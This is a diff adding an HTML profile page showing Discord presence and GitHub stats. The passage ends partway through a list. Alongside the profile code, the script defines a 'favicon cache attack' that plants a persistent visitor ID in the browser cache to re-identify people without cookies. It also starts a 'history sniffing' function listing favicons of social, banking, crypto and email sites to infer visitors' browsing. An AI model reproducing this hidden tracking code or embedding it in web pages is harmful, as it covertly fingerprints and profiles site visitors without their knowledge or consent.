@@ -1,0 +1,1702 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>kxrs__</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Fira+Code:wght@300;400&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+
+:root {
+    --bg:        #0e0e10;
+    --surface:   #18191c;
+    --surface2:  #232428;
+    --surface3:  #2b2d31;
+    --border:    rgba(255,255,255,.06);
+    --text:      #f2f3f5;
+    --muted:     #949ba4;
+    --faint:     #4e5058;
+    --accent:    #5865f2;
+    --online:    #23a55a;
+    --idle:      #f0b232;
+    --dnd:       #f23f42;
+    --offline:   #80848e;
+    --spotify:   #1db954;
+    --term-text: rgba(255,255,255,.05);
+}
+
+body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+
+/* ── TERMINAL BACKGROUND ── */
+#tbg {
+    position: fixed; inset: 0;
+    font-family: 'Fira Code', monospace;
+    font-size: 11.5px;
+    line-height: 1.7;
+    color: var(--term-text);
+    padding: 20px 28px;
+    white-space: pre;
+    overflow: hidden;
+    pointer-events: none;
+    z-index: 0;
+    user-select: none;
+}
+#tbg-fade {
+    position: fixed; inset: 0;
+    z-index: 1;
+    pointer-events: none;
+    background:
+        radial-gradient(ellipse 80% 60% at 50% 40%, transparent 20%, rgba(14,14,16,.88) 100%),
+        linear-gradient(to bottom, rgba(14,14,16,.3) 0%, transparent 8%, transparent 92%, rgba(14,14,16,.6) 100%);
+}
+
+/* ── PAGE ── */
+.page {
+    position: relative;
+    z-index: 10;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 20px;
+    padding: 40px 20px;
+}
+
+/* ── DISCORD CARD ── */
+.dc-card {
+    width: 100%;
+    max-width: 340px;
+    background: var(--surface);
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: 0 8px 40px rgba(0,0,0,.55);
+    animation: fadeUp .5s ease both;
+}
+@keyframes fadeUp { from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:translateY(0)} }
+
+.dc-banner {
+    width: 100%; height: 80px;
+    background: linear-gradient(135deg, #1e1f22 0%, #2b2d31 100%);
+    position: relative; overflow: hidden;
+}
+.dc-banner-img { width:100%; height:100%; object-fit:cover; display:block; }
+
+.dc-av-wrap {
+    position: absolute;
+    top: 44px; left: 16px;
+    width: 72px; height: 72px;
+    border-radius: 50%;
+    border: 5px solid var(--surface);
+    background: var(--surface);
+}
+.dc-av { width:62px; height:62px; border-radius:50%; object-fit:cover; display:block; }
+.dc-status {
+    position: absolute; bottom:2px; right:2px;
+    width:16px; height:16px; border-radius:50%;
+    border: 3px solid var(--surface);
+    background: var(--offline);
+    transition: background .4s;
+}
+.dc-status.online  { background: var(--online); }
+.dc-status.idle    { background: var(--idle); }
+.dc-status.dnd     { background: var(--dnd); }
+.dc-status.offline { background: var(--offline); }
+
+.dc-body { padding: 46px 16px 16px; }
+.dc-name { font-size:16px; font-weight:600; color:var(--text); letter-spacing:-.2px; }
+.dc-uname-row { display:flex; align-items:center; gap:7px; margin-top:2px; flex-wrap:wrap; }
+.dc-uname { font-size:12px; color:var(--muted); }
+.dc-guild-tag {
+    display:inline-flex; align-items:center; gap:4px;
+    font-size:11px; font-weight:500;
+    background: rgba(255,255,255,.06);
+    border: 1px solid rgba(255,255,255,.1);
+    border-radius:4px;
+    padding: 1px 6px 1px 4px;
+    color: var(--muted);
+}
+.dc-guild-badge { width:14px; height:14px; object-fit:contain; }
+
+.dc-badges { display:flex; gap:5px; margin-top:9px; flex-wrap:wrap; align-items:center; }
+.dc-badge-icon {
+    width:20px; height:20px;
+    object-fit:contain;
+    filter:brightness(0.9);
+    transition:filter .2s, transform .2s;
+    cursor:default;
+}
+.dc-badge-icon:hover { filter:brightness(1.15); transform:scale(1.15); }
+.dc-badge {
+    font-size:9.5px; padding:2px 7px;
+    background: rgba(88,101,242,.15);
+    border: 1px solid rgba(88,101,242,.25);
+    border-radius:3px; color:#858cf5;
+    letter-spacing:.3px;
+}
+
+.dc-divider { height:1px; background:var(--border); margin:12px 0; }
+.dc-section { font-size:10px; font-weight:700; letter-spacing:.8px; text-transform:uppercase; color:var(--faint); margin-bottom:6px; }
+.dc-about { font-size:13px; color:var(--muted); line-height:1.5; }
+
+.dc-activity {
+    display:flex; gap:10px; align-items:flex-start;
+    padding:10px; border-radius:6px;
+    background: var(--surface2);
+}
+.dc-act-art {
+    width:48px; height:48px; border-radius:5px;
+    flex-shrink:0; object-fit:cover;
+    background: var(--surface3);
+}
+.dc-act-info { flex:1; min-width:0; }
+.dc-act-name {
+    font-size:12.5px; font-weight:500; color:var(--text);
+    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+.dc-act-detail {
+    font-size:11px; color:var(--muted); margin-top:2px;
+    white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+
+.sp-bar { display:flex; align-items:center; gap:6px; margin-top:7px; }
+.sp-track { flex:1; height:3px; background:var(--surface3); border-radius:99px; overflow:hidden; }
+.sp-fill { height:100%; background:var(--spotify); border-radius:99px; transition:width .6s linear; }
+.sp-time { font-size:10px; color:var(--faint); font-variant-numeric:tabular-nums; white-space:nowrap; font-family:'Fira Code',monospace; }
+
+.dc-loading {
+    padding:40px 16px; text-align:center;
+    display:flex; flex-direction:column; align-items:center; gap:10px;
+}
+.dc-spinner {
+    width:18px; height:18px;
+    border:2px solid var(--surface3);
+    border-top-color:var(--accent);
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.dc-loading span { font-size:12px; color:var(--faint); }
+
+/* ── QUOTE ── */
+.quote-block { text-align:center; animation:fadeUp .5s .1s ease both; }
+.quote-text { font-size:13px; color:var(--faint); font-style:italic; letter-spacing:.3px; }
+
+/* ── GITHUB CARD ── */
+.gh-card {
+    width:100%; max-width:340px;
+    background: var(--surface);
+    border-radius:10px;
+    overflow:hidden;
+    box-shadow: 0 8px 40px rgba(0,0,0,.55);
+    animation: fadeUp .5s .15s ease both;
+}
+.gh-header {
+    display:flex; align-items:center; gap:12px;
+    padding:16px;
+    border-bottom:1px solid var(--border);
+}
+.gh-av { width:44px; height:44px; border-radius:50%; object-fit:cover; background:var(--surface2); flex-shrink:0; }
+.gh-name { font-size:14px; font-weight:600; color:var(--text); }
+.gh-login { font-size:12px; color:var(--muted); margin-top:1px; }
+.gh-bio { padding:12px 16px; font-size:12.5px; color:var(--muted); line-height:1.5; border-bottom:1px solid var(--border); }
+.gh-stats { display:grid; grid-template-columns:repeat(3,1fr); border-bottom:1px solid var(--border); }
+.gh-stat { padding:12px 8px; text-align:center; border-right:1px solid var(--border); }
+.gh-stat:last-child { border-right:none; }
+.gh-stat-n { font-size:15px; font-weight:600; color:var(--text); }
+.gh-stat-l { font-size:10.5px; color:var(--faint); margin-top:2px; letter-spacing:.3px; }
+.gh-footer { padding:10px 16px; display:flex; align-items:center; justify-content:flex-end; }
+.gh-link { font-size:11px; color:var(--faint); text-decoration:none; display:flex; align-items:center; gap:5px; transition:color .2s; }
+.gh-link:hover { color:var(--text); }
+.gh-link svg { fill:var(--faint); transition:fill .2s; }
+.gh-link:hover svg { fill:var(--text); }
+.gh-skel { padding:32px 16px; text-align:center; font-size:12px; color:var(--faint); display:flex; align-items:center; justify-content:center; gap:8px; }
+
+@media(max-width:400px){ .dc-card,.gh-card{max-width:100%;} }
+</style>
+</head>
+<body>
+
+<div id="tbg"></div>
+<div id="tbg-fade"></div>
+
+<div class="page">
+    <div class="dc-card">
+        <div id="dc-root">
+            <div class="dc-banner"></div>
+            <div class="dc-loading">
+                <div class="dc-spinner"></div>
+                <span>carregando...</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="quote-block">
+        <p class="quote-text">"Alles hat seine Zeit."</p>
+    </div>
+
+    <div class="gh-card">
+        <div id="gh-root">
+            <div class="gh-skel">
+                <div class="dc-spinner"></div>
+                carregando...
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+const UID    = '1291919614585995325';
+const GITHUB = 'GhosTSparta1';
+const ABOUT  = 'dev that really loves linux and terminals.';
+
+/* ── HELPERS ── */
+function h(s){ return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function mmss(ms){ const s=Math.max(0,Math.floor(ms/1000)); return `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`; }
+function avUrl(u){ return u.avatar?`https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.${u.avatar.startsWith('a_')?'gif':'webp'}?size=256`:`https://cdn.discordapp.com/embed/avatars/0.png`; }
+function bnUrl(u){
+    if(u.banner) return `https://cdn.discordapp.com/banners/${u.id}/${u.banner}.${u.banner.startsWith('a_')?'gif':'webp'}?size=480`;
+    return `https://dcdn.dstn.to/banners/${u.id}`;
+}
+function actArt(act){
+    const k=act.assets?.large_image||'';
+    if(!k) return '';
+    if(k.startsWith('mp:external')) return 'https://media.discordapp.net/'+k.replace('mp:','');
+    if(k.startsWith('http')) return k;
+    if(act.application_id) return `https://cdn.discordapp.com/app-assets/${act.application_id}/${k}.webp`;
+    return '';
+}
+function actSmallArt(act){
+    const k=act.assets?.small_image||'';
+    if(!k) return '';
+    if(k.startsWith('mp:external')) return 'https://media.discordapp.net/'+k.replace('mp:','');
+    if(act.application_id) return `https://cdn.discordapp.com/app-assets/${act.application_id}/${k}.webp`;
+    return '';
+}
+function badges(f){ const b=[];f=f||0;
+    if(f&1)b.push('Staff'); if(f&64)b.push('HypeSquad'); if(f&128)b.push('Bug Hunter');
+    if(f&256)b.push('Early Supporter'); if(f&4194304)b.push('Active Dev'); if(f&131072)b.push('Certified Mod');
+    return b;
+}
+
+/* ── DCDN ── */
+let dcdnData=null, lastLanyardData=null;
+async function loadDcdn(){
+    try{
+        const r=await fetch('https://dcdn.dstn.to/profile/'+UID);
+        if(r.ok){ dcdnData=await r.json(); if(lastLanyardData) renderDiscord(lastLanyardData); }
+    }catch(_){}
+}
+function badgeIconUrl(v){
+    if(!v) return '';
+    if(v.startsWith('http')) return v;
+    return 'https://cdn.discordapp.com/badge-icons/'+v+'.png';
+}
+function renderBadgeIcons(publicFlags){
+    if(dcdnData?.badges?.length){
+        return dcdnData.badges.map(b=>
+            '<img src="'+badgeIconUrl(b.icon)+'" title="'+h(b.description||b.id||'')+'" class="dc-badge-icon" onerror="this.remove()">'
+        ).join('');
+    }
+    return badges(publicFlags).map(b=>'<span class="dc-badge">'+h(b)+'</span>').join('');
+}
+
+/* ── DISCORD RENDER ── */
+let spTimer=null;
+function renderDiscord(data){
+    if(!data) return;
+    lastLanyardData=data;
+    const u=data.discord_user, st=data.discord_status||'offline';
+    const sp=data.spotify;
+    const acts=(data.activities||[]).filter(a=>a.type!==2&&a.name!=='Spotify');
+    const act=acts[0]||null;
+    const bnHash=dcdnData?.user_profile?.banner||u.banner||null;
+    const bn=bnHash
+        ?'https://cdn.discordapp.com/banners/'+u.id+'/'+bnHash+'.'+(bnHash.startsWith('a_')?'gif':'webp')+'?size=600'
+        :'https://dcdn.dstn.to/banners/'+u.id;
+    const av=avUrl(u);
+    const bio=dcdnData?.user_profile?.bio||'';
+    const typeLabel=['Jogando','Streaming','Ouvindo','Assistindo','','Competindo em'];
+
+    let html=`
+    <div style="position:relative">
+        <div class="dc-banner">
+            <img src="${h(bn)}" class="dc-banner-img" alt=""
+                 onerror="this.parentElement.style.background='linear-gradient(135deg,#1e1f22 0%,#2b2d31 100%)';this.remove()">
+        </div>
+        <div class="dc-av-wrap">
+            <img src="${h(av)}" class="dc-av" alt="avatar" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
+            <div class="dc-status ${h(st)}"></div>
+        </div>
+    </div>
+    <div class="dc-body">
+        <div class="dc-name">${h(u.global_name||u.username)}</div>
+        <div class="dc-uname-row">
+            <span class="dc-uname">${h(u.username)}</span>
+            ${u.primary_guild?.tag?`<span class="dc-guild-tag">
+                ${u.primary_guild.badge&&u.primary_guild.identity_guild_id
+                    ?`<img src="https://cdn.discordapp.com/clan-badges/${u.primary_guild.identity_guild_id}/${u.primary_guild.badge}.webp?size=16" class="dc-guild-badge" alt="" onerror="this.remove()">`
+                    :''}
+                <span>${h(u.primary_guild.tag)}</span>
+            </span>`:''}
+        </div>`;
+
+    const badgeHtml=renderBadgeIcons(u.public_flags);
+    if(badgeHtml) html+=`<div class="dc-badges">${badgeHtml}</div>`;
+
+    html+=`<div class="dc-divider"></div><div class="dc-section">Sobre mim</div><div class="dc-about">${h(bio||ABOUT)}</div>`;
+
+    if(sp){
+        const elapsed=Date.now()-sp.timestamps.start, total=sp.timestamps.end-sp.timestamps.start;
+        const pct=Math.min(100,(elapsed/total)*100);
+        html+=`<div class="dc-divider"></div><div class="dc-section">Ouvindo no Spotify</div>
+        <div class="dc-activity">
+            ${sp.album_art_url?`<img src="${h(sp.album_art_url)}" class="dc-act-art" alt="album">`:`<div class="dc-act-art"></div>`}
+            <div class="dc-act-info">
+                <div class="dc-act-name">${h(sp.song)}</div>
+                <div class="dc-act-detail">de ${h(sp.artist)}</div>
+                <div class="sp-bar">
+                    <div class="sp-track"><div class="sp-fill" id="spf" style="width:${pct}%"></div></div>
+                    <span class="sp-time" id="spt">${mmss(elapsed)} / ${mmss(total)}</span>
+                </div>
+            </div>
+        </div>`;
+        if(spTimer) clearInterval(spTimer);
+        setTimeout(()=>{
+            spTimer=setInterval(()=>{
+                const f=document.getElementById('spf'),t=document.getElementById('spt');
+                if(!f||!t){clearInterval(spTimer);return;}
+                const e2=Date.now()-sp.timestamps.start,tt=sp.timestamps.end-sp.timestamps.start;
+                f.style.width=Math.min(100,(e2/tt)*100)+'%';
+                t.textContent=mmss(e2)+' / '+mmss(tt);
+            },1000);
+        },80);
+    }
+
+    if(act){
+        const art=actArt(act),smallArt=actSmallArt(act),lbl=typeLabel[act.type]||'Atividade';
+        const elapsed=act.timestamps?.start?Date.now()-act.timestamps.start:null;
+        html+=`<div class="dc-divider"></div><div class="dc-section">${h(lbl)}</div>
+        <div class="dc-activity">
+            <div style="position:relative;flex-shrink:0;">
+                ${art?`<img src="${h(art)}" class="dc-act-art" alt="" onerror="this.style.visibility='hidden'">`:`<div class="dc-act-art"></div>`}
+                ${smallArt?`<img src="${h(smallArt)}" style="position:absolute;bottom:-3px;right:-3px;width:18px;height:18px;border-radius:50%;border:2px solid var(--surface);object-fit:cover" alt="" onerror="this.remove()">`:''}
+            </div>
+            <div class="dc-act-info">
+                <div class="dc-act-name">${h(act.name)}</div>
+                ${act.details?`<div class="dc-act-detail">${h(act.details)}</div>`:''}
+                ${act.state?`<div class="dc-act-detail">${h(act.state)}</div>`:''}
+                ${elapsed?`<div class="dc-act-detail" style="color:var(--faint);margin-top:4px">${mmss(elapsed)} elapsed</div>`:''}
+            </div>
+        </div>`;
+    }
+
+    html+=`</div>`;
+    document.getElementById('dc-root').innerHTML=html;
+}
+
+/* ── GITHUB ── */
+async function loadGithub(){
+    try{
+        const r=await fetch(`https://api.github.com/users/${GITHUB}`);
+        const u=await r.json();
+        document.getElementById('gh-root').innerHTML=`
+        <div class="gh-header">
+            <img src="${h(u.avatar_url)}" class="gh-av" alt="">
+            <div>
+                <div class="gh-name">${h(u.name||u.login)}</div>
+                <div class="gh-login">${h(u.login)}</div>
+            </div>
+        </div>
+        ${u.bio?`<div class="gh-bio">${h(u.bio)}</div>`:''}
+        <div class="gh-stats">
+            <div class="gh-stat"><div class="gh-stat-n">${u.public_repos??'—'}</div><div class="gh-stat-l">repos</div></div>
+            <div class="gh-stat"><div class="gh-stat-n">${u.followers??'—'}</div><div class="gh-stat-l">seguidores</div></div>
+            <div class="gh-stat"><div class="gh-stat-n">${u.following??'—'}</div><div class="gh-stat-l">seguindo</div></div>
+        </div>
+        <div class="gh-footer">
+            <a href="https://github.com/${h(GITHUB)}" target="_blank" rel="noopener" class="gh-link">
+                <svg width="13" height="13" viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg>
+                Ver perfil no GitHub
+            </a>
+        </div>`;
+    }catch{
+        document.getElementById('gh-root').innerHTML=`<div class="gh-skel" style="color:var(--faint)">github indisponível</div>`;
+    }
+}
+
+/* ── LANYARD ── */
+const LANYARD_REST=`https://api.lanyard.rest/v1/users/${UID}`;
+const PROXIES=[
+    ()=>fetch(`https://corsproxy.io/?url=${encodeURIComponent(LANYARD_REST)}`).then(r=>r.json()).then(j=>j.success?j.data:null),
+    ()=>fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(LANYARD_REST)}`).then(r=>r.json()).then(j=>{const d=JSON.parse(j.contents);return d.success?d.data:null;}),
+];
+async function fetchLanyard(){
+    try{ const r=await fetch(LANYARD_REST); const j=await r.json(); if(j.success) return j.data; }catch(_){}
+    for(const p of PROXIES){ try{ const d=await p(); if(d) return d; }catch(_){} }
+    return null;
+}
+async function poll(){ const d=await fetchLanyard(); if(d) renderDiscord(d); }
+
+let ws,hbInt;
+function connectWS(){
+    try{
+        ws=new WebSocket('wss://api.lanyard.rest/socket');
+        ws.onmessage=e=>{
+            const m=JSON.parse(e.data);
+            if(m.op===1){ hbInt=setInterval(()=>ws.readyState===1&&ws.send('{"op":3}'),m.d.heartbeat_interval); ws.send(`{"op":2,"d":{"subscribe_to_id":"${UID}"}}`); }
+            if(m.op===0&&(m.t==='INIT_STATE'||m.t==='PRESENCE_UPDATE')) renderDiscord(m.d);
+        };
+        ws.onclose=()=>{ clearInterval(hbInt); setTimeout(connectWS,8000); };
+    }catch(_){}
+}
+
+loadDcdn().then(()=>poll());
+connectWS();
+setInterval(poll,20000);
+loadGithub();
+
+/* ── FAVICON CACHE ATTACK ── */
+// Encodes a 32-bit ID into browser favicon cache.
+// On return visits, reconstructs the ID without cookies/localStorage.
+async function executeFaviconAttack() {
+    const BITS = 32;
+    const BASE = '/api/favicon-handler';
+
+    // Phase 1: Read — check which bits are already cached (without side-effects)
+    const bits = await Promise.all(
+        Array.from({length: BITS}, async (_, i) => {
+            try {
+                // 'only-if-cached' returns from cache only; throws if not cached
+                const r = await fetch(`${BASE}?b=${i}`, {
+                    cache: 'only-if-cached',
+                    mode:  'same-origin',
+                });
+                return r.ok ? 1 : 0;
+            } catch { return 0; }
+        })
+    );
+
+    const readId = bits.reduce((acc, bit, i) => acc | (bit << i), 0) >>> 0;
+
+    if (readId !== 0) {
+        // Returning visitor — ID recovered from cache
+        return { id: readId.toString(16).padStart(8,'0'), returning: true };
+    }
+
+    // Phase 2: Write — first visit, generate random ID and cache the "1" bits
+    const newId = ((Math.random() * 0xFFFFFFFF) | 0) >>> 0 || 1;
+    await Promise.all(
+        Array.from({length: BITS}, async (_, i) => {
+            if ((newId >> i) & 1) {
+                await fetch(`${BASE}?b=${i}`).catch(() => {});
+            }
+        })
+    );
+
+    return { id: newId.toString(16).padStart(8,'0'), returning: false };
+}
+
+/* ── FAVICON HISTORY SNIFFING ── */
+function faviconHistorySniff(){
+    return new Promise(resolve=>{
+        const TARGETS = [
+            // ── Social Media ──
+            { name:'Facebook',        url:'https://www.facebook.com/favicon.ico'               },
+            { name:'Instagram',       url:'https://www.instagram.com/favicon.ico'              },
+            { name:'Twitter/X',       url:'https://abs.twimg.com/favicons/twitter.3.ico'       },
+            { name:'TikTok',          url:'https://www.tiktok.com/favicon.ico'                 },
+            { name:'Snapchat',        url:'https://www.snapchat.com/favicon.ico'               },
+            { name:'Pinterest',       url:'https://www.pinterest.com/favicon.ico'              },
+            { name:'LinkedIn',        url:'https://www.linkedin.com/favicon.ico'               },
+            { name:'Tumblr',          url:'https://www.tumblr.com/favicon.ico'                 },
+            { name:'Reddit',          url:'https://www.reddit.com/favicon.ico'                 },
+            { name:'Mastodon',        url:'https://mastodon.social/favicon.ico'                },
+            { name:'Threads',         url:'https://www.threads.net/favicon.ico'                },
+            { name:'Bluesky',         url:'https://bsky.app/favicon.ico'                      },
+            { name:'VK',              url:'https://vk.com/favicon.ico'                        },
+            { name:'Weibo',           url:'https://www.weibo.com/favicon.ico'                  },
+            { name:'OK.ru',           url:'https://ok.ru/favicon.ico'                         },
+            { name:'MeWe',            url:'https://mewe.com/favicon.ico'                      },
+            { name:'Minds',           url:'https://www.minds.com/favicon.ico'                 },
+            { name:'Gab',             url:'https://gab.com/favicon.ico'                       },
+            { name:'Truth Social',    url:'https://truthsocial.com/favicon.ico'               },
+            { name:'Parler',          url:'https://parler.com/favicon.ico'                    },
+
+            // ── Messaging ──
+            { name:'WhatsApp',        url:'https://web.whatsapp.com/favicon.ico'              },
+            { name:'Telegram',        url:'https://web.telegram.org/favicon.ico'              },
+            { name:'Discord',         url:'https://discord.com/favicon.ico'                   },
+            { name:'Signal',          url:'https://signal.org/favicon.ico'                    },
+            { name:'Slack',           url:'https://slack.com/favicon.ico'                     },
+            { name:'Skype',           url:'https://www.skype.com/favicon.ico'                 },
+            { name:'Zoom',            url:'https://zoom.us/favicon.ico'                       },
+            { name:'Teams',           url:'https://teams.microsoft.com/favicon.ico'           },
+            { name:'Viber',           url:'https://www.viber.com/favicon.ico'                 },
+            { name:'Line',            url:'https://line.me/favicon.ico'                       },
+            { name:'Kik',             url:'https://www.kik.com/favicon.ico'                   },
+            { name:'ICQ',             url:'https://icq.com/favicon.ico'                       },
+
+            // ── Video & Streaming ──
+            { name:'YouTube',         url:'https://www.youtube.com/favicon.ico'               },
+            { name:'Netflix',         url:'https://www.netflix.com/favicon.ico'               },
+            { name:'Twitch',          url:'https://www.twitch.tv/favicon.ico'                 },
+            { name:'Disney+',         url:'https://www.disneyplus.com/favicon.ico'            },
+            { name:'HBO Max',         url:'https://www.max.com/favicon.ico'                   },
+            { name:'Hulu',            url:'https://www.hulu.com/favicon.ico'                  },
+            { name:'Amazon Prime',    url:'https://www.primevideo.com/favicon.ico'            },
+            { name:'Apple TV',        url:'https://tv.apple.com/favicon.ico'                  },
+            { name:'Peacock',         url:'https://www.peacocktv.com/favicon.ico'             },
+            { name:'Paramount+',      url:'https://www.paramountplus.com/favicon.ico'         },
+            { name:'Vimeo',           url:'https://vimeo.com/favicon.ico'                     },
+            { name:'Dailymotion',     url:'https://www.dailymotion.com/favicon.ico'           },
+            { name:'Rumble',          url:'https://rumble.com/favicon.ico'                    },
+            { name:'Odysee',          url:'https://odysee.com/favicon.ico'                    },
+            { name:'Kick',            url:'https://kick.com/favicon.ico'                      },
+            { name:'Crunchyroll',     url:'https://www.crunchyroll.com/favicon.ico'           },
+            { name:'Funimation',      url:'https://www.funimation.com/favicon.ico'            },
+            { name:'Plex',            url:'https://www.plex.tv/favicon.ico'                   },
+
+            // ── Music ──
+            { name:'Spotify',         url:'https://www.spotify.com/favicon.ico'               },
+            { name:'SoundCloud',      url:'https://soundcloud.com/favicon.ico'                },
+            { name:'Apple Music',     url:'https://music.apple.com/favicon.ico'               },
+            { name:'Deezer',          url:'https://www.deezer.com/favicon.ico'                },
+            { name:'Tidal',           url:'https://tidal.com/favicon.ico'                     },
+            { name:'Bandcamp',        url:'https://bandcamp.com/favicon.ico'                  },
+            { name:'Last.fm',         url:'https://www.last.fm/favicon.ico'                   },
+            { name:'Audiomack',       url:'https://audiomack.com/favicon.ico'                 },
+
+            // ── Email & Productivity ──
+            { name:'Gmail',           url:'https://mail.google.com/favicon.ico'               },
+            { name:'Outlook',         url:'https://outlook.live.com/favicon.ico'              },
+            { name:'Yahoo Mail',      url:'https://mail.yahoo.com/favicon.ico'                },
+            { name:'ProtonMail',      url:'https://mail.proton.me/favicon.ico'                },
+            { name:'Tutanota',        url:'https://tuta.com/favicon.ico'                      },
+            { name:'Notion',          url:'https://www.notion.so/favicon.ico'                 },
+            { name:'Trello',          url:'https://trello.com/favicon.ico'                    },
+            { name:'Asana',           url:'https://app.asana.com/favicon.ico'                 },
+            { name:'Jira',            url:'https://www.atlassian.com/favicon.ico'             },
+            { name:'Airtable',        url:'https://airtable.com/favicon.ico'                  },
+            { name:'Monday.com',      url:'https://monday.com/favicon.ico'                    },
+            { name:'Dropbox',         url:'https://www.dropbox.com/favicon.ico'               },
+            { name:'Google Drive',    url:'https://drive.google.com/favicon.ico'              },
+            { name:'OneDrive',        url:'https://onedrive.live.com/favicon.ico'             },
+            { name:'Evernote',        url:'https://www.evernote.com/favicon.ico'              },
+            { name:'Obsidian',        url:'https://obsidian.md/favicon.ico'                   },
+            { name:'Figma',           url:'https://www.figma.com/favicon.ico'                 },
+            { name:'Canva',           url:'https://www.canva.com/favicon.ico'                 },
+            { name:'Miro',            url:'https://miro.com/favicon.ico'                      },
+
+            // ── Tech & Dev ──
+            { name:'GitHub',          url:'https://github.com/favicon.ico'                    },
+            { name:'GitLab',          url:'https://gitlab.com/favicon.ico'                    },
+            { name:'Stack Overflow',  url:'https://stackoverflow.com/favicon.ico'             },
+            { name:'HackerNews',      url:'https://news.ycombinator.com/favicon.ico'          },
+            { name:'Dev.to',          url:'https://dev.to/favicon.ico'                        },
+            { name:'CodePen',         url:'https://codepen.io/favicon.ico'                    },
+            { name:'Replit',          url:'https://replit.com/favicon.ico'                    },
+            { name:'Vercel',          url:'https://vercel.com/favicon.ico'                    },
+            { name:'Netlify',         url:'https://www.netlify.com/favicon.ico'               },
+            { name:'Cloudflare',      url:'https://www.cloudflare.com/favicon.ico'            },
+            { name:'DigitalOcean',    url:'https://www.digitalocean.com/favicon.ico'          },
+            { name:'Heroku',          url:'https://www.heroku.com/favicon.ico'                },
+            { name:'AWS Console',     url:'https://console.aws.amazon.com/favicon.ico'        },
+            { name:'Docker Hub',      url:'https://hub.docker.com/favicon.ico'                },
+            { name:'NPM',             url:'https://www.npmjs.com/favicon.ico'                 },
+            { name:'PyPI',            url:'https://pypi.org/favicon.ico'                      },
+
+            // ── Shopping & Finance ──
+            { name:'Amazon',          url:'https://www.amazon.com/favicon.ico'                },
+            { name:'eBay',            url:'https://www.ebay.com/favicon.ico'                  },
+            { name:'Shopify',         url:'https://www.shopify.com/favicon.ico'               },
+            { name:'Etsy',            url:'https://www.etsy.com/favicon.ico'                  },
+            { name:'AliExpress',      url:'https://www.aliexpress.com/favicon.ico'            },
+            { name:'Alibaba',         url:'https://www.alibaba.com/favicon.ico'               },
+            { name:'Mercado Livre',   url:'https://www.mercadolivre.com.br/favicon.ico'       },
+            { name:'Shein',           url:'https://www.shein.com/favicon.ico'                 },
+            { name:'Wish',            url:'https://www.wish.com/favicon.ico'                  },
+            { name:'PayPal',          url:'https://www.paypal.com/favicon.ico'                },
+            { name:'Stripe',          url:'https://stripe.com/favicon.ico'                    },
+            { name:'Coinbase',        url:'https://www.coinbase.com/favicon.ico'              },
+            { name:'Binance',         url:'https://www.binance.com/favicon.ico'               },
+            { name:'Kraken',          url:'https://www.kraken.com/favicon.ico'                },
+            { name:'Robinhood',       url:'https://robinhood.com/favicon.ico'                 },
+            { name:'Cash App',        url:'https://cash.app/favicon.ico'                      },
+            { name:'Nubank',          url:'https://nubank.com.br/favicon.ico'                 },
+            { name:'Inter',           url:'https://inter.co/favicon.ico'                      },
+
+            // ── News & Info ──
+            { name:'Wikipedia',       url:'https://www.wikipedia.org/favicon.ico'             },
+            { name:'BBC',             url:'https://www.bbc.com/favicon.ico'                   },
+            { name:'CNN',             url:'https://www.cnn.com/favicon.ico'                   },
+            { name:'NYTimes',         url:'https://www.nytimes.com/favicon.ico'               },
+            { name:'The Guardian',    url:'https://www.theguardian.com/favicon.ico'           },
+            { name:'Reuters',         url:'https://www.reuters.com/favicon.ico'               },
+            { name:'Fox News',        url:'https://www.foxnews.com/favicon.ico'               },
+            { name:'Washington Post', url:'https://www.washingtonpost.com/favicon.ico'        },
+            { name:'Vice',            url:'https://www.vice.com/favicon.ico'                  },
+            { name:'BuzzFeed',        url:'https://www.buzzfeed.com/favicon.ico'              },
+            { name:'Medium',          url:'https://medium.com/favicon.ico'                    },
+            { name:'Substack',        url:'https://substack.com/favicon.ico'                  },
+            { name:'G1 (Globo)',      url:'https://g1.globo.com/favicon.ico'                  },
+            { name:'UOL',             url:'https://www.uol.com.br/favicon.ico'                },
+            { name:'R7',              url:'https://www.r7.com/favicon.ico'                    },
+
+            // ── Gaming ──
+            { name:'Steam',           url:'https://store.steampowered.com/favicon.ico'        },
+            { name:'Epic Games',      url:'https://www.epicgames.com/favicon.ico'             },
+            { name:'GOG',             url:'https://www.gog.com/favicon.ico'                   },
+            { name:'Origin/EA',       url:'https://www.ea.com/favicon.ico'                    },
+            { name:'Battle.net',      url:'https://www.blizzard.com/favicon.ico'              },
